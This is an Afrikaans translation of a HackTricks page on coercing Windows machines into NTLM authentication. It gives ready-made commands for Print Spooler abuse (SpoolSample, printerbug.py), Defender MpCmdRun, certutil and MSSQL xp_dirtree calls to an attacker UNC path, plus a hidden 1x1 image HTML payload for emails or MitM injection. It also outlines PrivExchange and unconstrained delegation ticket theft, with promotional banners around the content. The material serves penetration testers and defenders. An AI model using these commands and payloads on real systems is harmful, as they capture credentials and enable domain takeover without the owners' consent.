# Dwang NTLM Bevoorregte Verifikasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **afgeleë verifikasie-aanwysers** wat in C# geskryf is met behulp van die MIDL-kompilator om 3rd party-afhanklikhede te vermy.

## Spooler-diensmisbruik

As die _**Print Spooler**_-diens **geaktiveer** is, kan jy van sommige reeds bekende AD-verifikasie-inligting gebruik maak om die drukkerserver van die domeinbeheerder te versoek om 'n opdatering oor nuwe drukwerk te stuur en net sê dat dit die kennisgewing na 'n sekere stelsel moet **stuur**.\
Let daarop dat wanneer die drukker die kennisgewing na 'n willekeurige stelsel stuur, dit teen daardie **stelsel** geverifieer moet word. Daarom kan 'n aanvaller die _**Print Spooler**_-diens dwing om teen 'n willekeurige stelsel te verifieer, en die diens sal die rekenaarrekening in hierdie verifikasie **gebruik**.

### Vind Windows-bedieners op die domein

Gebruik PowerShell om 'n lys van Windows-bokse te kry. Bedieners het gewoonlik voorrang, so laat ons daarop fokus:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Opsoek na Spooler-diens wat luister

Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler-diens luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN-protokol.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Vra die diens om teen 'n willekeurige gasheer te verifieer

Jy kan [**SpoolSample hier vandaan**](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompileer.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte se dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinasie met Onbeperkte Delegasie

As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-delegation.md) gekompromitteer het, kan die aanvaller die drukker laat outentiseer teen hierdie rekenaar. As gevolg van die onbeperkte delegasie sal die **TGT** van die **rekenaarrekening van die drukker** in die **geheue** van die rekenaar met onbeperkte delegasie **gestoor word**. Aangesien die aanvaller reeds hierdie gasheer gekompromitteer het, sal hy in staat wees om hierdie kaartjie te **herwin** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).

## RCP Kragtige outentisering

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Die `PrivExchange`-aanval is die gevolg van 'n fout wat gevind is in die **Exchange-bediener se `PushSubscription`-funksie**. Hierdie funksie maak dit moontlik dat die Exchange-bediener deur enige domein-gebruiker met 'n posbus gedwing kan word om te outentiseer na enige kliëntverskafte gasheer oor HTTP.

Standaard loop die **Exchange-diens as SYSTEM** en word oormatige bevoegdhede gegee (spesifiek, dit het **WriteDacl-bevoegdhede op die domein voor 2019 Kumulatiewe Opdatering**). Hierdie fout kan uitgebuit word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS-databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om na ander gasheer binne die domein te oorplas en outentiseer. Die suksesvolle uitbuiting van hierdie aanval verleen onmiddellike toegang tot die Domeinadministrateur met enige geoutentiseerde domein-gebruikersrekening.

## Binne Windows

As jy reeds binne die Windows-rekenaar is, kan jy Windows dwing om met bevoorregte rekeninge na 'n bediener te verbind met:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL is 'n relationele databasisbestuurstelsel wat ontwikkel is deur Microsoft. Dit word algemeen gebruik vir die stoor en bestuur van data in toepassings en webwerwe. MSSQL bied 'n kragtige en veilige omgewing vir die hantering van groot hoeveelhede data. Dit ondersteun ook gevorderde funksies soos transaksies, aanvraagverwerking en databasisbeveiliging.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-ondertekende binêre lêer) te gebruik om NTLM-verifikasie af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-inspuiting

### Via e-pos

As jy die **e-posadres** van die gebruiker ken wat in 'n masjien wil inbreek, kan jy hom net 'n **e-pos met 'n 1x1-beeld** stuur, soos
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
en wanneer hy dit oopmaak, sal hy probeer om te verifieer.

### MitM

As jy 'n MitM-aanval kan uitvoer op 'n rekenaar en HTML in 'n bladsy kan inspuit wat hy sal sien, kan jy probeer om 'n prent soos die volgende in die bladsy in te spuit:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Kraking NTLMv1

As jy [NTLMv1 uitdagings kan vasvang, lees hier hoe om dit te kraak](../ntlm/#ntlmv1-attack).\
_Onthou dat jy Responder-uitdaging moet instel op "1122334455667788" om NTLMv1 te kraak._

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
